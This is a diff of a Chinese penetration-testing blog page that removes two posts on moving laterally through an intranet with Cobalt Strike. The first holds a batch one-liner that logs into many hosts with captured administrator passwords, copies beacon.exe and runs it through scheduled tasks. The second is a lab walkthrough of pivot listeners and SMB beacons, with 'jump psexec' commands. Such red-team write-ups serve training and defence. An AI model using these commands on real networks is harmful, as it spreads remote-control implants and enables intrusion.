-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell for &#x2F;f %i in (c:\windows\temp\login_succeed.txt) do net use \\%i\admin$ &#x2F;user:&quot;administrator&quot; &quot;xxxxx&quot; &amp;&amp; copy C:\windows\temp\beacon.exe \\%i\admin$\temp\ &amp;&amp; schtasks &#x2F;create &#x2F;s %i &#x2F;u &quot;administrator&quot; &#x2F;p &quot;xxxxx&quot; &#x2F;RL HIGHEST &#x2F;F &#x2F;tn &quot;xxxxxxxxxxx&quot; &#x2F;tr &quot;c:\windows\temp\beacon.exe&quot; &#x2F;sc DAILY &#x2F;mo 1 &#x2F;ST 11:06 &amp;&amp; schtasks &#x2F;run &#x2F;tn xxxxxxxxxxx &#x2F;s %i &#x2F;U &quot; administrator&quot; &#x2F;P &quot;xxxxx&quot; &amp;&amp; schtasks &#x2F;query &#x2F;s %i &#x2F;U &quot;administrator&quot; &#x2F;P &quot;xxxxx&quot; | findstr &quot;xxxxxxxxxxx&quot; &amp;&amp; schtasks &#x2F;delete &#x2F;F &#x2F;tn xxxxxxxxxxx &#x2F;s %i &#x2F;U &quot; administrator&quot; &#x2F;P &quot;xxxxx&quot; &amp;&amp; net use \\%i\admin$ &#x2F;del</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%89%B9%E9%87%8F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200831165538229.png" alt="image-20200831165538229"></p>
-<p>​        <strong>使用计划任务有一个限制，就是我们启动计划任务的用户必须是在线的状态，如果是注销状态或者其他没有登录的状态，则无法正常上线。</strong></p>
-<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>​        通过上面的学习总结，我们发现仅仅依托cobaltstrike再加上几条命令，即可完成批量上线内网断网主机的目的，需要注意的是使用service来批量横向生成的shell类型要使用service类型，计划任务上线需要目标用户处于登录状态。</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-        
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="cn">
-    <link itemprop="mainEntityOfPage" href="https://cangqingzhe.github.io/2020/08/28/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%96%AD%E7%BD%91%E4%B8%BB%E6%9C%BA%E4%B8%8A%E7%BA%BF%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="藏青">
-      <meta itemprop="description" content="知行合一">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="藏青's BLOG">
-    </span>
-      <header class="post-header">
-        <h1 class="post-title" itemprop="name headline">
-          
-            <a href="/2020/08/28/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%96%AD%E7%BD%91%E4%B8%BB%E6%9C%BA%E4%B8%8A%E7%BA%BF%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/" class="post-title-link" itemprop="url">关于内网断网主机上线的学习总结</a>
-        </h1>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-
-              <time title="Created: 2020-08-28 17:12:06" itemprop="dateCreated datePublished" datetime="2020-08-28T17:12:06+08:00">2020-08-28</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2020-09-02 20:04:20" itemprop="dateModified" datetime="2020-09-02T20:04:20+08:00">2020-09-02</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              <span class="post-meta-item-text">In</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" itemprop="url" rel="index">
-                    <span itemprop="name">内网渗透</span>
-                  </a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>​        在进行内网横向移动的过程中我们可能经常会遇到这样的情况，目标内网中的其他主机不出外网，那么我们使用cs直接生成的reverse shell就没有办法使目标内网中的”断网”主机上线，今天我就和大家一起学习如何上线内网的”断网”主机。</p>
-<h3 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">OWA2013:192.168.3.144 192.168.5.55   模拟边界机192.168.5.*这个网段使用nat模式，192.168.3.*使用仅主机模式</span><br><span class="line">ser-web:192.168.3.73 模拟内网断网机</span><br></pre></td></tr></table></figure>
-
-<h3 id="Pivot-listener"><a href="#Pivot-listener" class="headerlink" title="Pivot listener"></a>Pivot listener</h3><p><strong>建立Pivot listener</strong></p>
-<p>​        首先让边界主机OWA2013上线,上线后对着边界机右键，选择pivoting-&gt;Listener</p>
-<p><img src="/2020/08/28/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%96%AD%E7%BD%91%E4%B8%BB%E6%9C%BA%E4%B8%8A%E7%BA%BF%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200828180723949.png" alt="image-20200828180723949"></p>
-<p>​        配置过程中需要注意，这里的<strong>Listen host要选择和内网主机所在一个段所对应的ip</strong>，我这里是192.168.3.144</p>
-<p><img src="/2020/08/28/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%96%AD%E7%BD%91%E4%B8%BB%E6%9C%BA%E4%B8%8A%E7%BA%BF%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200828180840537.png" alt="image-20200828180840537"></p>
-<p>​        <img src="/2020/08/28/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%96%AD%E7%BD%91%E4%B8%BB%E6%9C%BA%E4%B8%8A%E7%BA%BF%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200828181006859.png" alt="image-20200828181006859"></p>
-<p>​            Pivot listener生成好以后，选择Packages-&gt;windows executalbe(s)</p>
-<p><img src="/2020/08/28/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%96%AD%E7%BD%91%E4%B8%BB%E6%9C%BA%E4%B8%8A%E7%BA%BF%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200828181100073.png" alt="image-20200828181100073"></p>
-<p>​        配置过程中Listener选择我们刚生成的Pivot listener</p>
-<p><img src="/2020/08/28/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%96%AD%E7%BD%91%E4%B8%BB%E6%9C%BA%E4%B8%8A%E7%BA%BF%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200828181152418.png" alt="image-20200828181152418"></p>
-<p>​        假设我们这里已经拿到了内网断网主机的密码，使用ipc进行连接。</p>
-<p><img src="/2020/08/28/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%96%AD%E7%BD%91%E4%B8%BB%E6%9C%BA%E4%B8%8A%E7%BA%BF%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200828181857058.png" alt="image-20200828181857058"></p>
-<p>​        在文件管理这里将生成的文件上传到断网主机</p>
-<p><img src="/2020/08/28/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%96%AD%E7%BD%91%E4%B8%BB%E6%9C%BA%E4%B8%8A%E7%BA%BF%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200828182328347.png" alt="image-20200828182328347"></p>
-<p>​        使用remote exec wmi模块去执行上传的exe</p>
-<p><img src="/2020/08/28/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%96%AD%E7%BD%91%E4%B8%BB%E6%9C%BA%E4%B8%8A%E7%BA%BF%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200828182839924.png" alt="image-20200828182839924"></p>
-<p>​        目标主机上线，这里有一个小点需要注意，就是上线的这台断网机只要我们不进行交互默认的last时间就是一直增长的，这里不需要管这个超时时间的问题，需要的时候执行命令就可以了</p>
-<p><img src="/2020/08/28/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%96%AD%E7%BD%91%E4%B8%BB%E6%9C%BA%E4%B8%8A%E7%BA%BF%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200828182918650.png" alt="image-20200828182918650"></p>
-<p><img src="/2020/08/28/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%96%AD%E7%BD%91%E4%B8%BB%E6%9C%BA%E4%B8%8A%E7%BA%BF%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200828183126947.png" alt="image-20200828183126947"></p>
-<h3 id="smb-beacon"><a href="#smb-beacon" class="headerlink" title="smb beacon"></a>smb beacon</h3><p><strong>什么是smb beacon？</strong></p>
-<p>​        SMB Beacon使用命名管道通过父级Beacon进行通讯，当两个Beacons链接后，子Beacon从父Beacon获取到任务并发送。 因为链接的Beacons使用Windows命名管道进行通信，此流量封装在SMB协议中，所以SMB Beacon相对隐蔽，绕防火墙时可能发挥奇效(系统防火墙默认是允许445的端口与外界通信的，其他端口可能会弹窗提醒，会导致远程命令行反弹shell失败)。</p>
-<p><strong>什么是命名管道？</strong></p>
-<p>​        “命名管道” 又名 “命名管线”，但是通常都叫命名管道，是一种简单基于 SMB 协议的进程间通信（Internet Process Connection - IPC）机制。 在计算机编程里，命名管道可在同一台计算机的不同进程之间或在<strong>跨越一个网络的不同计算机的不同进程之间</strong>，支持可靠的、单向或双向的数据通信传输。和一般的管道不同，命名管道可以被不同进程以不同的方式方法调用（可以跨语言、跨平台）。只要程序知道命名管道的名字，任何进程都可以通过该名字打开管道的另一端，根据给定的权限和服务器进程通信。</p>
-<p><strong>命名规范</strong><br>命名管道的命名是采用的 UNC 格式：\Server\Pipe[Path]Name 的。</p>
-<p>第一部分\Server指定了服务器的名字，命名管道服务即在此服务器创建，其字符串部分可表示为一个小数点(表示本机)、星号(当前网络字段)、域名或是一个真正的服务；第二部分 pipe 是一个不可变化的硬编码字串，以指出该文件是从属于 NTFS；第三部分[Path]Name则使应用程序可以唯一定义及标识一个命名管道的名字，而且可以设置多级目录。</p>
-<p><img src="/2020/08/28/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%96%AD%E7%BD%91%E4%B8%BB%E6%9C%BA%E4%B8%8A%E7%BA%BF%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200831103821108.png" alt="image-20200831103821108"></p>
-<p><strong>利用条件</strong></p>
-<ul>
-<li>目标开放445端口</li>
-<li>得知目标主机账号密码并建立ipc连接</li>
-</ul>
-<p><strong>如何使用smb beacon</strong></p>
-<p>​        首先我们创建一个smb的listener</p>
-<p><img src="/2020/08/28/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%96%AD%E7%BD%91%E4%B8%BB%E6%9C%BA%E4%B8%8A%E7%BA%BF%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200831101527143.png" alt="image-20200831101527143"></p>
-<p>​        我们再通过ipc和内网的断网主机192.168.3.73建立连接</p>
-<p><img src="/2020/08/28/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%96%AD%E7%BD%91%E4%B8%BB%E6%9C%BA%E4%B8%8A%E7%BA%BF%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200831101635873.png" alt="image-20200831101635873"></p>
-<p>​        建立连接后通过jump命令来让192.168.3.73这台断网主机上线</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jump psexec 192.168.3.73 smb</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2020/08/28/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%96%AD%E7%BD%91%E4%B8%BB%E6%9C%BA%E4%B8%8A%E7%BA%BF%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200831101807854.png" alt="image-20200831101807854"></p>
-<p><img src="/2020/08/28/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%96%AD%E7%BD%91%E4%B8%BB%E6%9C%BA%E4%B8%8A%E7%BA%BF%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200831101834919.png" alt="image-20200831101834919"></p>
-<p>​        上线后根据自己的需要执行对应的操作即可</p>
-<p><img src="/2020/08/28/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%96%AD%E7%BD%91%E4%B8%BB%E6%9C%BA%E4%B8%8A%E7%BA%BF%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200831101901136.png" alt="image-20200831101901136"></p>
-<p>​        当使用结束后，可以使用unlink命令取消和该内网主机的连接</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unlink 192.168.3.73</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2020/08/28/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%96%AD%E7%BD%91%E4%B8%BB%E6%9C%BA%E4%B8%8A%E7%BA%BF%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200831102021398.png" alt="image-20200831102021398"></p>
-<p>​        当想再次让该断网主机上线，使用link命令连接即可</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">link 192.168.3.73</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2020/08/28/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%96%AD%E7%BD%91%E4%B8%BB%E6%9C%BA%E4%B8%8A%E7%BA%BF%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200831102234598.png" alt="image-20200831102234598"></p>
-<p><strong>Pivot listener和smb beacon在使用上的区别</strong></p>
-<ul>
-<li><p>使用pivot listener可以使用生成executables来上线，也可以使用jumpexec的方式上线</p>
-<p>​    首先创建一个pivot listener test666</p>
-<p><img src="/2020/08/28/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%96%AD%E7%BD%91%E4%B8%BB%E6%9C%BA%E4%B8%8A%E7%BA%BF%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200831114634920.png" alt="image-20200831114634920"></p>
-<p>​        配置这里还是要注意应该选择和断网机所在一个C段的ip，我这里是192.168.3.144</p>
-</li>
-</ul>
-<p><img src="/2020/08/28/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%96%AD%E7%BD%91%E4%B8%BB%E6%9C%BA%E4%B8%8A%E7%BA%BF%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200831114730991.png" alt="image-20200831114730991"></p>
-<p>​            使用ipc和目标主机建立连接，使用jump psexec来让目标主机上线，test666为刚刚创建的pivote listener的名字</p>
-<p><img src="/2020/08/28/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%96%AD%E7%BD%91%E4%B8%BB%E6%9C%BA%E4%B8%8A%E7%BA%BF%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200831115052331.png" alt="image-20200831115052331"></p>
-<p>​        成功上线</p>
-<p><img src="/2020/08/28/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%96%AD%E7%BD%91%E4%B8%BB%E6%9C%BA%E4%B8%8A%E7%BA%BF%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200831115201232.png" alt="image-20200831115201232"></p>
-<ul>
-<li>使用smb beacon可以使用jumpexec的方式上线，但不能使用生成executables来上线</li>
-</ul>
-<p>Attacks-&gt;packages-&gt;windows executable(s),listener选择smb</p>
-<p><img src="/2020/08/28/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%96%AD%E7%BD%91%E4%B8%BB%E6%9C%BA%E4%B8%8A%E7%BA%BF%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200831112921031.png" alt="image-20200831112921031"></p>
-<p>​        将生成的文件上传到目标主机</p>
-<p><img src="/2020/08/28/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%96%AD%E7%BD%91%E4%B8%BB%E6%9C%BA%E4%B8%8A%E7%BA%BF%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200831113055853.png" alt="image-20200831113055853"></p>
-<p>​        使用remote-exec来执行beacon.exe</p>
-<p><img src="/2020/08/28/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%96%AD%E7%BD%91%E4%B8%BB%E6%9C%BA%E4%B8%8A%E7%BA%BF%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200831114043504.png" alt="image-20200831114043504"></p>
-<p>​        目标主机成功执行beacon.exe，但是并不能上线</p>
-<p><img src="/2020/08/28/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%96%AD%E7%BD%91%E4%B8%BB%E6%9C%BA%E4%B8%8A%E7%BA%BF%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200831114118504.png" alt="image-20200831114118504"></p>
-<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>​        最后我总结一下这两种上线方式的使用区别</p>
-<ul>
-<li>pivot listener主要使用端口转发的方式来上线断网主机，这种方式会在我们的边界主机上开放一个端口，如果目标内网存在防火墙，则有可能无法使用这种方式来进行横向移动，但是使用这种方式既可以使用生成exe并执行的方式来上线，也可以使用psexec的方式来上线断网机。</li>
-<li>使用smb beacon仅仅需要可以和目标的445端口进行通信即可，不需要额外开启其他端口，并且使用smb上线可以规避防火墙。但是这种方式不能使用生成exe并执行的方式上线，只能通过使用psexec的方式上线。</li>
-</ul>
-<p><strong>参考文章</strong></p>
-<p><a href="https://pythonpig.github.io/2018/01/17/Cobaltstrike-SMB-beacon/" target="_blank" rel="noopener">Cobaltstrike SMB beacon(命名管道相关知识)</a></p>
-<p><a href="http://blog.leanote.com/post/snowming/8b7ce0f84c03" target="_blank" rel="noopener">CS 4.0 SMB Beacon</a></p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
   </div>
 
   
@@ -1914,20 +1710,20 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">23</span>
+          <span class="site-state-item-count">26</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
             <a href="/categories/">
           
-        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-count">5</span>
         <span class="site-state-item-name">categories</span></a>
       </div>
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">8</span>
+        <span class="site-state-item-count">11</span>
         <span class="site-state-item-name">tags</span></a>
       </div>
   </nav>
